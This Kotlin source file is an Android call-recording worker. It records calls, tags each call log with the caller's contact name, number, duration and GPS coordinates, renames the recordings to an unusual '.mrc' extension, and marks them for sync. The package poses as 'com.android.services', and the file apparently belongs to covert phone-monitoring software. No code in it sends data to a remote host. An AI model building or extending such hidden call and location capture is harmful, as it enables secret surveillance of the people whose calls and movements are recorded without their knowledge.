package com.android.services.workers.callRecord

import android.app.Service
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import androidx.work.Data
import androidx.work.WorkManager
import com.android.services.db.entities.CallLog
import com.android.services.db.entities.CallRecording
import com.android.services.enums.CallRecordType
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.CallRecord
import com.android.services.nativePackage.RecorderHelper
import com.android.services.receiver.AudioFileCompressorReceiver
import com.android.services.services.callRecord.CallRecordProcessingBaseI
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.Mp3LameRecorder
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.arthenica.mobileffmpeg.Config
import com.arthenica.mobileffmpeg.FFmpeg
import com.google.gson.Gson
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.core.Observable
import io.reactivex.rxjava3.schedulers.Schedulers
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.greenrobot.eventbus.EventBus
import org.greenrobot.eventbus.Subscribe
import java.io.File
import java.util.concurrent.TimeUnit

class CallRecordProcessingBaseImpll(
    val appContext: Context, val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : CallRecordProcessingBase(appContext) {
    override fun initialize() {
        mLastCallId = 0
        logVerbose("${AppConstants.CALL_RECORD_TYPE} In Initialized Recording")
        AppUtils.appendLog(
            appContext.applicationContext,
            "${AppConstants.CALL_RECORD_TYPE} In Initialized Recording"
        )
        EventBus.getDefault().register(this);
    }

    override fun parseIntent(data: Data?) {
        data?.let {
            logVerbose(
                "In OnStartCommand -> Ready to start CallRecord Recording",
                AppConstants.CALL_LOG_TYPE
            )
            val callRecordJsonString = it.getString(IntentKey.KEY_CALL_RECORD)
            callRecordJsonString?.let {
                callRecord = Gson().fromJson(it, CallRecord::class.java)
                callRecord?.let { _ ->
                    createOutputFilePath()
                    if (mp3LameRecorder == null) {
                        mp3LameRecorder = Mp3LameRecorder(mFilePath!!, 44100)
                    }
                    AppUtils.appendLog(
                        appContext.applicationContext,
                        "${AppConstants.CALL_RECORD_TYPE} Extra CallRecord = $callRecord"
                    )
                    logVerbose("${AppConstants.CALL_RECORD_TYPE} Extra CallRecord = $callRecord")
                    executorService.execute {
                        logVerbose("going to retriver mLastCallId", "ANRInfoLogs")
                        mLastCallId = AppUtils.getLastCallId(context)
                        logVerbose("mLastCallId retreived mLastCallId=$mLastCallId", "ANRInfoLogs")
                        startRecording()
                    }
                } ?: kotlin.run {
                    logVerbose(
                        "CallRecord Extra is Null -> Stopping Service",
                        AppConstants.CALL_LOG_TYPE
                    )
                    stopThisService()
                }
            }
        } ?: kotlin.run {
            logVerbose("${AppConstants.CALL_LOG_TYPE} CallRecord Intent is Null")
            AppUtils.appendLog(
                appContext.applicationContext,
                "CallRecord Intent is null, stopping service"
            )
            stopThisService()
        }
    }

    override fun createOutputFilePath(): String {
        mFilePath = AppUtils.retrieveFilePath(
            context,
            AppConstants.DIR_CALL_RECORD,
            "${System.currentTimeMillis()}_${AppUtils.generateUniqueID()}.mp3"
        )
        AppUtils.appendLog(
            appContext.applicationContext,
            "${AppConstants.CALL_RECORD_TYPE} filePath = $mFilePath"
        )
        logVerbose("${AppConstants.CALL_RECORD_TYPE} filePath = $mFilePath")
        return mFilePath!!
    }

    private fun startNativeRecording() {
        try {
            logVerbose("Call recording worker started", "CallRecordingInfo")
            val recorderHelper = RecorderHelper.getInstance()
            mRecordingStartTime = System.currentTimeMillis()
            logVerbose("Preparing to start native recording")
            AppUtils.appendLog(
                appContext.applicationContext,
                "${AppConstants.CALL_RECORD_TYPE} Preparing to start native recording"
            )
            if (mp3LameRecorder != null) {
                recorderHelper.startFixCallRecorder(context, 0)
                mp3LameRecorder!!.startRecording(Mp3LameRecorder.TYPE_CALL_RECORD)
                logVerbose("Native Call Recording Started")
                AppUtils.appendLog(
                    appContext.applicationContext,
                    "${AppConstants.CALL_RECORD_TYPE} Native Call Recording Started"
                )
            } else {
                logVerbose("mp3LameRecorder Instance is Null")
                AppUtils.appendLog(
                    appContext.applicationContext,
                    "mp3LameRecorder Instance is Null"
                )
                stopThisService()
            }
        } catch (exp: Exception) {
            logException(
                "${AppConstants.CALL_RECORD_TYPE} startNativeRecording Exception ",
                throwable = exp
            )
            stopThisService()
        }
    }

    private fun stopThisService() {
        WorkManager.getInstance(appContext).cancelUniqueWork(CALL_RECORDING_WORKER_TAG)
    }

    private fun stopSimpleRecording() {
        try {
            if (mp3LameRecorder != null) {
                mp3LameRecorder!!.stopRecording()
                logVerbose("Call Recording Stopped")
                AppUtils.appendLog(
                    appContext.applicationContext,
                    "${AppConstants.CALL_RECORD_TYPE} Call Recording Stopped"
                )
            }
        } catch (exp: Exception) {
            logException(
                "${AppConstants.CALL_RECORD_TYPE} startNativeRecording Exception ",
                throwable = exp
            )
            stopThisService()
        }
    }

    override fun startRecording() {
        logVerbose("Preparing to start recording")
        logVerbose("Call recording started in callRecordService", "CallRecordingInfo")
        AppUtils.appendLog(
            appContext.applicationContext,
            "${AppConstants.CALL_RECORD_TYPE} Preparing to start recording"
        )
        try {
            startTimerObserver()
            when (callRecord!!.callRecordType) {
                CallRecordType.TYPE_SIMPLE_CALL -> {
                    startSimpleRecording()
                }

                CallRecordType.TYPE_NATIVE_CALL -> {
                    startNativeRecording()
                }
            }
        } catch (exp: Exception) {
            logException("Call Recording Start Error", throwable = exp)
            AppUtils.appendLog(
                appContext.applicationContext,
                "${AppConstants.CALL_RECORD_TYPE} Call Recording Start Error"
            )
            stopThisService()
        }
    }

    private fun startSimpleRecording() {
        try {
            logVerbose("Call recording worker started", "CallRecordingInfo")
            logVerbose("Simple Call Recording Starting")
            AppUtils.appendLog(
                appContext.applicationContext,
                "${AppConstants.CALL_RECORD_TYPE} Simple Call Recording Started"
            )
            mRecordingStartTime = System.currentTimeMillis()
            if (mp3LameRecorder != null) {
                mp3LameRecorder!!.startRecording(Mp3LameRecorder.TYPE_CALL_RECORD)
                logVerbose("Simple Call Recording Started")
                AppUtils.appendLog(
                    appContext.applicationContext,
                    "${AppConstants.CALL_RECORD_TYPE} Simple Call Recording Started"
                )
            } else {
                logVerbose("mp3LameRecorder Instance is Null")
                AppUtils.appendLog(
                    appContext.applicationContext,
                    "mp3LameRecorder Instance is Null"
                )
                stopThisService()
            }
        } catch (exp: Exception) {
            logException(
                "${AppConstants.CALL_RECORD_TYPE} startSimpleRecording Exception ",
                throwable = exp
            )
            stopThisService()
        }
    }

    private fun startTimerObserver() {
        disposable = Observable.interval(
            CallRecordProcessingBaseI.INITIAL_DELAY,
            CallRecordProcessingBaseI.PERIODIC_INTERVAL, TimeUnit.MILLISECONDS
        )
            .subscribeOn(Schedulers.single())
            .observeOn(AndroidSchedulers.mainThread())
            .doOnSubscribe {

            }
            .subscribe {
                if (!AppUtils.isCallModeActive(context)) {
                    logVerbose("${AppConstants.CALL_RECORD_TYPE} call mode is in-Active, Stopping Service")
                    AppUtils.appendLog(
                        appContext.applicationContext,
                        "${AppConstants.CALL_RECORD_TYPE} call mode is in-Active, Stopping Service"
                    )
                    stopThisService()
                }
            }
    }

    override fun startCommand() {

    }

    override suspend fun stopRecording() {
        withContext(Dispatchers.IO) {
            logVerbose("Preparing to stop recording")
            AppUtils.appendLog(
                appContext.applicationContext,
                "${AppConstants.CALL_RECORD_TYPE} Preparing to stop recording"
            )
            try {
                when (callRecord!!.callRecordType) {
                    CallRecordType.TYPE_SIMPLE_CALL, CallRecordType.TYPE_NATIVE_CALL -> {
                        stopSimpleRecording()
                    }
                }
            } catch (exp: Exception) {
                AppUtils.appendLog(
                    appContext.applicationContext,
                    "${AppConstants.CALL_RECORD_TYPE} Stop Call Recording Error: ${exp.message}"
                )
                logException("Stop Call Recording Error: ", CallRecordProcessingBaseI.TAG, exp)
                stopThisService()
            }
        }
    }

    override fun onServiceDestroy() {
        logVerbose("In OnDestroy", CallRecordProcessingBaseI.TAG)
        AppUtils.appendLog(
            appContext.applicationContext,
            "${AppConstants.CALL_RECORD_TYPE} In OnDestroy"
        )
        try {
            coroutineScope.launch(Dispatchers.Main) {
                stopRecording()
                delay(1500)
                reNameFile(appContext.applicationContext, mFilePath!!, null)
                saveRecording()
                shutDownExecutorService()
                disposeDisposable()
                EventBus.getDefault().unregister(this);
                logVerbose("Call recording Service stoped", "CallRecordingInfo")
                LocalBroadcastManager.getInstance(appContext)
                    .sendBroadcast(Intent(AudioFileCompressorReceiver.ACTION_COMPRESS_AUDIO))
            }
        } catch (exp: Exception) {
            AppUtils.appendLog(
                appContext.applicationContext,
                "${AppConstants.CALL_RECORD_TYPE} Error In OnDestroy Call Recording: ${exp.message}"
            )
            logException("Error In OnDestroy Call Recording ", CallRecordProcessingBaseI.TAG, exp)
            EventBus.getDefault().unregister(this);
        }
    }

    @Subscribe
    fun onMessageEvent(event: String) {
        if (event == "stopCallRecording" && !isEventMarkedAsReceived) {
            logVerbose(
                "stop call recording event received in call record service",
                "CallRecordingInfo"
            )
            isEventMarkedAsReceived = true
            coroutineScope.launch(Dispatchers.Main) {
                stopRecording()
            }
            mHandler.postDelayed(kotlinx.coroutines.Runnable {
                stopThisService()
            }, 8500)
        }
    }

    private fun shutDownExecutorService() {
        if (!executorService.isShutdown) {
            executorService.shutdown()
        }
    }

    private fun disposeDisposable() {
        if (disposable != null && !disposable!!.isDisposed) {
            disposable!!.dispose()
        }
    }

    private suspend fun saveRecording() {
        withContext(Dispatchers.IO) {
            mFilePath = mFilePath!!.replace(".mp3", ".mrc")
            logVerbose("Preparing to save recording")
            mLastCallId = AppUtils.getLastCallId(context)
            AppUtils.appendLog(appContext.applicationContext, "Preparing to save recording")
            val lastCallDetails = AppUtils.getLastCallDetails(
                appContext,
                mLastCallId,
                callRecord!!.phoneNumber,
                callRecord!!.callType,
                mRecordingStartTime
            )
            logVerbose("Last Call details = $lastCallDetails")
            AppUtils.appendLog(
                appContext.applicationContext,
                "Last Call details = $lastCallDetails"
            )
            if (lastCallDetails.length() > 0) {
                val callId = lastCallDetails.getString("id")
                val callerName =
                    AppUtils.getContactName(lastCallDetails.getString("number"), context)
                var callName = AppUtils.formatDateTimezone(lastCallDetails.getString("date"))
                val callNumber = lastCallDetails.getString("number")
                val callDuration = lastCallDetails.getString("duration")
                val callDate = callRecord?.callDateTime
                    ?: AppUtils.formatDate(lastCallDetails.getString("date"))
                val callType = lastCallDetails.getString("type")
                val sameCallRecordingList =
                    localDatabaseSource.checkIfCallRecordExist(callDate, callNumber)
                callName += if (sameCallRecordingList.isNotEmpty()) {
                    "($sameCallRecordingList)"
                } else {
                    "(1)"
                }
                //Insert Call Recording
                val callRecording = CallRecording()
                callRecording.apply {
                    this.file = mFilePath!!
                    this.callerName = callerName
                    this.callName = callName
                    this.callDuration = callDuration
                    this.callStartTime = callDate
                    this.callDirection = callType
                    this.callNumber = callNumber
                    this.isCompressed = 0
                    this.status = 0
                }
                localDatabaseSource.insertCallRecording(callRecording)
                logVerbose("call Recording inserted")
                AppUtils.appendLog(appContext.applicationContext, "call Recording inserted")
                val isRecorded = if (mFilePath != null && AppUtils.validFileSize(File(mFilePath))) {
                    "1"
                } else {
                    "0"
                }
                if (AppConstants.callLogSync) {
                    // Insert Call Log
                    val callLog = CallLog()
                    callLog.apply {
                        uniqueId = callId.toString()
                        this.callerName = callerName
                        this.callName = callName
                        this.callNumber = callNumber
                        callStartTime = callDate
                        this.callDuration = callDuration
                        callDirection = callType
                        longitude = AppConstants.locationLongitude ?: ""
                        latitude = AppConstants.locationLatitude ?: ""
                        this.isRecorded = isRecorded
                        date = AppUtils.getDate(lastCallDetails.getString("date").toLong())
                        callStatus = 0
                    }
                    localDatabaseSource.insertCall(callLog)
                    AppUtils.appendLog(
                        appContext.applicationContext,
                        "callLog Inserted in db"
                    )
                }
                AppUtils.appendLog(
                    appContext.applicationContext,
                    "CallRecording Saved in db"
                )
                logVerbose("callLog Inserted & CallRecording Saved in db")
            }
        }
    }

    /* This compresses the Output CallRecord File */
    private suspend fun compressOutputFile(): String? {
        return try {
            if (AppConstants.osGreaterThanEqualToNougat) {
                withContext(Dispatchers.IO) {
                    val destFile = "compress_${mFilePath!!.substringAfterLast("/")}"
                    val destFilePath =
                        mFilePath!!.replace(mFilePath!!.substringAfterLast("/"), destFile)
//            val rc = FFmpeg.execute("-i $mFilePath -c:v mpeg4 $destFilePath")
                    when (val rc =
                        FFmpeg.execute("-y -i $mFilePath -ar 44100 -ac 2 -ab 20k -c:v mpeg4 $destFilePath")) {
                        Config.RETURN_CODE_SUCCESS -> {
                            logVerbose(
                                "Command execution completed successfully.",
                                AppConstants.CALL_RECORD_TYPE
                            )
                            AppUtils.appendLog(
                                appContext.applicationContext,
                                "Command execution completed successfully"
                            )
                            destFilePath
                        }

                        Config.RETURN_CODE_CANCEL -> {
                            AppUtils.appendLog(
                                appContext.applicationContext,
                                "Command execution cancelled by user"
                            )
                            logVerbose(
                                "Command execution cancelled by user.",
                                AppConstants.CALL_RECORD_TYPE
                            )
                            AppUtils.deleteFile(context, destFilePath)
                            null
                        }

                        else -> {
                            AppUtils.appendLog(
                                appContext.applicationContext,
                                "Command execution failed with rc=%d and the output below"
                            )
                            logVerbose(
                                String.format(
                                    "Command execution failed with rc=%d and the output below.",
                                    rc
                                ), AppConstants.CALL_RECORD_TYPE
                            )
                            AppUtils.deleteFile(context, destFilePath)
                            Config.printLastCommandOutput(Log.INFO)
                            null
                        }
                    }
                }
            } else null
        } catch (e: Exception) {
            null
        }
    }

    private suspend fun reNameFile(context: Context, sourceFile: String, destFile: String?) {
        withContext(Dispatchers.IO) {
            if (destFile != null) {
                AppUtils.reNameSourceFileWithDestFile(
                    context,
                    sourceFile,
                    destFile,
                    AppConstants.CALL_RECORD_TYPE
                )
            } else {
                AppUtils.reNameFile(sourceFile, AppConstants.CALL_RECORD_TYPE)
                AppUtils.appendLog(
                    appContext.applicationContext,
                    "Compression destFile Path is Null"
                )
                logVerbose("compression destFile Path is Null", AppConstants.CALL_RECORD_TYPE)
            }
        }
    }
}